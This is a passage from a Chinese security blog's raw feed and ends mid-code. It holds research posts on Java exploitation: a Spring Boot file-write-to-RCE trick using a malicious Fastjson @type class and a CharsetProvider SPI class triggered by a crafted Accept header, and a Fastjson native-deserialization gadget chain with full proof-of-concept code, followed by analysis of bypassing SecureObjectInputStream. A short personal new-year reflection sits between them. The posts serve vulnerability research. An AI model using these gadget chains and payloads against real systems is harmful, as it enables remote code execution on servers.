class_">AutoCloseable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/hacker.txt&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Hacker&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h3><p>跟进Charset.forName的源码，可以看到存在三个加载Charset的方法，跟进第三种方法，跟进其代码，很明显是一个SPI加载provider的模式。</p><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743590578389-c9f7771a-a6aa-46fa-a18b-70dc48af5b6f.png"></p><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743590844658-77e03ed4-c5ae-41ce-bd2e-76b1294e2b7b.png"></p><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743590888449-f4cee28c-98ab-4dd6-8547-adb34b6f43e5.png"></p><p>可以通过编写一个继承了java.nio.charset.spi.CharsetProvider类的恶意provider，通过SPI机制，触发其加载并初始化。但需要注意的是，由于使用到的是系统类加载器，它对应的是Ext ClassLoader，理论上需要打包成jar包并放到jre&#x2F;lib&#x2F;ext内，并且根据类加载器缓存的机制，需要重启后才能加载到该jar包。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">java</span>.nio.charset.spi.CharsetProvider &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;Charset&gt; <span class="title function_">charsets</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Charset&gt;().iterator();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Charset <span class="title function_">charsetForName</span><span class="params">(String charsetName)</span> &#123;</span><br><span class="line">        <span class="comment">// 因为Charset会被缓存, 导致同样的charsetName只能执行一次</span></span><br><span class="line">        <span class="comment">// 所以可以利用前缀触发, 后面的内容不断变化即可, 甚至可以把命令通过charsetName传入</span></span><br><span class="line">        <span class="keyword">if</span> (charsetName.startsWith(<span class="string">&quot;Evil&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Charset.forName(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目录结构</span></span><br><span class="line">.</span><br><span class="line">├── Evil.class</span><br><span class="line">└── META-INF</span><br><span class="line">    └── services</span><br><span class="line">        └── java.nio.charset.spi.CharsetProvider</span><br></pre></td></tr></table></figure><p>接着将Evil.class和SPI文件放到jre&#x2F;classes目录后，重新启动SpringBoot项目，构造攻击请求即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://127.0.0.1:18081/&quot;</span> -H <span class="string">&quot;Accept: text/html;Charset=Evil&quot;</span></span><br></pre></td></tr></table></figure><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>在实际场景中可能需要对服务器上的JDK目录进行爆破；</p><p>在文件上传漏洞中一般无法创建目录，由于classes目录通常需要攻击者自行创建，所以classes和spi的利用方式可能相对于直接覆盖charset.jar的方式来说可执行性较差。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://landgrey.me/blog/22/">Spring Boot FatJar写文件漏洞到稳定RCE的探索</a></p><p><a href="https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/">JDK8任意文件写场景下的SpringBoot RCE</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> Trick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024小结</title>
      <link href="/2024/12/31/2024%E6%80%BB%E7%BB%93/"/>
      <url>/2024/12/31/2024%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p><strong><em>回首2023，这一年最大的感悟就是逐渐明白了苏轼笔下的人间清醒</em></strong><br>人潮熙熙攘攘，“窥一斑而知豹，落一叶而知秋”<br>生活平平淡淡，“人间有味是清欢”</p><p><strong><em>展望2024，一岁有一岁的味道，一站有一站的风景，沿途的花一直会开，以后的路也是，祝你也祝我</em></strong><br>人潮熙熙攘攘，“人生如逆旅，我亦是行人”<br>生活平平淡淡，“手持烟火以谋生，心怀诗意以谋爱”</p><p><img src="/2024/12/31/2024%E6%80%BB%E7%BB%93/life.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson与原生反序列化</title>
      <link href="/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在高版本的Fastjson利用中，除了利用黑名单外的类，还有什么其它的办法能够绕过AutoType呢？实际上，Fastjson自身其实也会在JDK原生反序列化中作为一个Gadget来触发漏洞，利用这一特性就可以绕过高版本Fastjson中对Autotype的限制。</p><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>由于是利用Fastjson实现原生反序列化，那么需要先知道在Fastjson包中有哪些类继承了Serializable接口，利用IDEA搜一下发现<strong>JSONArray</strong>和<strong>JSONObject</strong>这两个类符合条件。</p><p><img src="/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1735108071487-7819c514-1d3e-42e9-b995-95e099eb6ca2.png"></p><p>JSONArray和JSONObject这两个类虽然实现了Serializable接口，但是自身并没有实现readObject方法的重载，并且继承的JSON类同样没有readObject方法。</p><p>因此，只能通过其他类的readObject做中转，从而触发JSONArray、JSONObject或者JSON类当中的某个方法，最终实现利用链构造。</p><p>在上一篇文章<a href="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/">Cursory Analysis Of Fastjson</a>，在分析parse突破特殊getter调用限制时，提到了可以利用JSONObject#toString来触发任意类的getter方法，那么能不能利用这个特性来实现FastJson在原生反序列化当中的利用呢？</p><p>既然可以触发任意类的getter方法，不难想到可以直接利用TemplatesImpl类的getOutputProperties方法实现字节码动态加载来触发恶意方法利用。那么现在就只需要找到JDK原生反序列化触发toString方法的Gadget，这也是一个很熟悉的知识点了，可以利用下面两条Gadget来调用toString方法：</p><ol><li><strong>BadAttributeValueExpException#readObject -&gt; JSONObject#toString</strong></li></ol><p><img src="/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1735109543831-7ca02be8-d7ec-4c96-811a-96bd81060eb5.png"></p><ol start="2"><li><strong>HashMap#readObject -&gt; XString#equals -&gt; JSONObject#toString</strong></li></ol><p><img src="/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1735109620247-2a4c19bd-8809-48e9-a1b1-bb04c0bd9eda.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonSelfUnser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpExceptionPoc</span> <span class="operator">=</span> getBadAttributeValueExpExceptionPoc();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> getXStringPoc();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreeCustomObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(hashMap);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BadAttributeValueExpException <span class="title function_">getBadAttributeValueExpExceptionPoc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(getTemplatesImpl());</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getXStringPoc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(getTemplatesImpl());</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map1.put(<span class="string">&quot;aa&quot;</span>, jsonArray);</span><br><span class="line">        map1.put(<span class="string">&quot;bB&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;aa&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;bB&quot;</span>, jsonArray);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map2, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="再探"><a href="#再探" class="headerlink" title="再探"></a>再探</h2><p>在上文中实现了Fastjson作为原生反序列化的Gadget利用，但是上文的POC仅限于fastjson 1.2.48版本之前，这是因为从1.2.49版本开始，JSONArray与JSONObject拥有了自己的readObject方法。</p><p><img src="/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1735117010650-e05169cc-32b0-4894-afe0-66217ea1ea64.png"></p><p>此时的反序列化的调用过程如下，先触发一次<strong>不安全的</strong>ObjectInputStream的readObject，然后当调用JSONArray&#x2F;JSONObject的Object方法触发反序列化时，会将这个反序列化过程委托给SecureObjectInputStream进行处理，触发resolveClass实现对恶意类的拦截。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不安全的反序列化过程</span></span><br><span class="line">ObjectInputStream -&gt; readObject -&gt; SecureObjectInputStream -&gt; readObject -&gt; resolveClass</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常规防御反序列过程</span></span><br><span class="line">TestInputStream -&gt; readObject -&gt; resolveClass</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">if</span> (name.length() &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> name.lastIndexOf(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (index != -<span class="number">1</span>) &#123;</span><br><span class="line">            name = name.substring(index + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (name.length() &gt; <span class="number">2</span> &amp;&amp; name.charAt(<span class="number">0</span>) == <span class="string">&#x27;L&#x27;</span> &amp;&amp; name.charAt(name.length() - <span class="number">1</span>) == <span class="string">&#x27;;&#x27;</span>) &#123;</span><br><span class="line">            name = name.substring(<span class="number">1</span>, name.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (TypeUtils.getClassFromMapping(name) == <span class="literal">null</span>) &#123;</span><br><span class="line">            ParserConfig.global.checkAutoType(name, <span class="literal">null</span>, Feature.SupportAutoType.mask);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，当第一次的ObjectInputStream#readObject并未进行安全防御时，会进入SecureObjectInputStream来处理反序列化流程，此时如果能绕过resolveClass，那么就依旧能实现恶意的反序列化攻击。</p><p>为了实现这个目的，先看看在什么情况下会调用resolveClass方法来实现对恶意类的拦截，在SecureObjectInputStream#resolveClass方法处下断点，查看一下堆栈信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">resolveClass:<span class="number">586</span>, JSONObject$SecureObjectInputStream (com.alibaba.fastjson)</span><br><span class="line">readNonProxyDesc:<span class="number">1613</span>, ObjectInputStream (java.io)</span><br><span class="line">readClassDesc:<span class="number">1518</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1774</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">2000</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadObject:<span class="number">501</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">486</span>, JSONArray (com.alibaba.fastjson)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在java.io.ObjectInputStream#readObject0方法中，会根据读到的bytes中tc的数据类型进行对应的处理来恢复部分对象。在Switch-Case语句中，大部分方法最终都会调用readClassDesc去获取类的描述符，而不会调用readClassDesc方法的分支有TC_NULL、TC_REFERENCE、TC_STRING、TC_LONGSTRING、TC_EXCEPTION，其中NULL、STRING与LONGSTRING类型没有什么用处，EXCEPTION类型则是解决序列化终止相关，因此只剩下REFERENCE类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">    <span class="keyword">case</span> TC_NULL:</span><br><span class="line">        <span class="keyword">return</span> readNull();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">        <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">        <span class="keyword">return</span> readClass(unshared);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">    <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">        <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TC_STRING:</span><br><span class="line">    <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">        <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">        <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">        <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">        <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">        <span class="type">IOException</span> <span class="variable">ex</span> <span class="operator">=</span> readFatalException();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WriteAbortedException</span>(<span class="string">&quot;writing aborted&quot;</span>, ex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">    <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">        <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">            bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">            bin.peek();             <span class="comment">// force header read</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(</span><br><span class="line">                bin.currentBlockRemaining());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                <span class="string">&quot;unexpected block data&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">        <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                <span class="string">&quot;unexpected end of block data&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">            String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，如果当前反序列化数据下一位仍然是TC_CLASSDESC，则会在readNonProxyDesc方法中触发resolveClass方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readClassDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">byte</span> <span class="variable">tc</span> <span class="operator">=</span> bin.peekByte();</span><br><span class="line">    <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">        <span class="keyword">case</span> TC_NULL:</span><br><span class="line">            <span class="keyword">return</span> (ObjectStreamClass) readNull();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">            <span class="keyword">return</span> (ObjectStreamClass) 